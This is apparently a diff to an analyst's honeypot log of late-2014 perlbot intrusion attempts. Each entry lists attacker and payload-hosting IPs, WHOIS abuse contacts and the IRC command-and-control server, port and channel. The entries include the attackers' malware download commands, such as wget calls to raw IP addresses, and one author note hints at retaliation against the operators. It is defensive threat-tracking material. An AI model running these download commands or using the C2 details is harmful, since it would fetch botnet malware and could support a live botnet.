@@ -853,6 +853,154 @@ WHOIS: NA
 Notes:
 -Interesting little php-based webshell. gets named "x9.php"
 
+#12/5/14
+
+Pitcher: 89.248.172.175
+Catcher: 87.106.63.71
+Nslookup (pitcher): freevideohosting4u.pw
+WHOIS (pitcher):
+89.248.172.0/23
+Ecatel Ltd.
+NL
+abuse@ecatel.info
+AS29073
+NSlookup (catcher): s17584703.onlinehome-server.info
+WHOIS (catcher):
+87.106.0.0/16
+1&1 Internet AG
+DE
+abuse@oneandone.net
+AS8560
+Payload: perlbot
+Description: wget -q http://87.106.63.71/android.txt
+Server: 82.165.130.187
+Port:12443
+Channel: #new
+NSlookup: cashauto.venderoro.eu
+WHOIS:
+82.165.128.0/21
+1&1 Internet AG
+DE
+abuse@oneandone.net
+AS8560
+Notes:
+
+Pitcher: 72.9.231.226
+Catcher: 100.42.30.34
+Nslookup (pitcher):
+WHOIS (pitcher):
+NSlookup (catcher): rongless.net
+WHOIS (catcher):
+100.42.16.0/20
+Fork Networking LLC
+US
+abuse@forked.net
+AS46841
+Payload: wget http://100.42.30.34/lex
+Description: perlbot
+Server: 95.211.88.161
+Port: 443
+Channel: #gnx
+NSlookup: hosted-by.megardp.eu
+WHOIS:
+95.211.0.0/16
+Leaseweb
+NL
+abuse@leaseweb.com
+AS60781
+Notes:
+-I had fun with these guys a little bit ago. Probably got the sads that I sent so many friends to say hi.
+-other pitchers: 72.55.168.51
+
+Pitcher: 206.212.255.154
+Catcher: 217.199.160.244
+Nslookup (pitcher): NX
+WHOIS (pitcher):
+206.212.240.0/20
+Colostore.com
+US
+noc@colostore.com
+AS12260
+NSlookup (catcher): 361135.vps-10.com
+WHOIS (catcher):
+217.199.160.0/24
+Webfusion Internet Solutions
+GB
+abuse@heartinternet.com
+AS20738
+Payload: wget http://217.199.160.244/fix
+Description: perlbot
+Server: 104.200.65.162
+Port: 21
+Channel: #gnx
+NSlookup: NX
+WHOIS:
+104.200.65.0/24
+Stealthy Hosting
+Notes:
+-this CnC server has also been seen hosting other channels as well. (#php for RFI attacks)
+-this CnC server also has IRC server listeners on 443 and 8443. Maybe to get around firewalls for different exploited hosts?
+
+Pitcher: 67.228.177.97
+Catcher: 209.236.71.188
+Nslookup (pitcher): midphase.com
+WHOIS (pitcher):
+67.228.177.0/24
+Matt McBride
+NSlookup (catcher): host.softsolutions.com
+WHOIS (catcher):
+209.236.64.0/20
+WestHost, Inc.
+US
+abuse@uk2group.com
+AS29854
+Payload: wget http://209.236.71.188/midx
+Description: perlbot
+Server: 77.92.68.68
+Port: 80
+Channel: #gnx
+NSlookup: server54312.uk2net.com
+WHOIS:
+77.92.64.0/19
+UK2 Customer
+GB
+abuse@uk2.net
+AS13213
+Notes:
+-identical to the CnC Server above, except CnC is on port 80 and port 8067.
+
+#1/5/14:
+
+Pitcher: 37.187.135.6
+Catcher: 185.56.60.83
+Nslookup (pitcher):
+WHOIS (pitcher):
+37.187.0.0/16
+OVH SAS
+FR
+abuse@ovh.net
+AS16276
+NSlookup (catcher):
+WHOIS (catcher):
+185.56.60.0/22
+Orange Lemon BV
+NL
+abuse@orangelemon.nl
+AS49544
+Payload: wget http://185.56.60.83/il.zip
+Description: perlbot
+Server: 69.162.97.106
+Port: 8443
+Channel: #gnx
+NSlookup:
+WHOIS:
+69.162.64.0/18
+Limestone Networks
+US
+abuse@limestonenetworks.com
+Notes:
+-Oh hey! It's this guy again. and just in time for the new year.
+
 #Template. CHOOSE YOUR OWN ADVENTURE!
 Pitcher:
 Catcher:
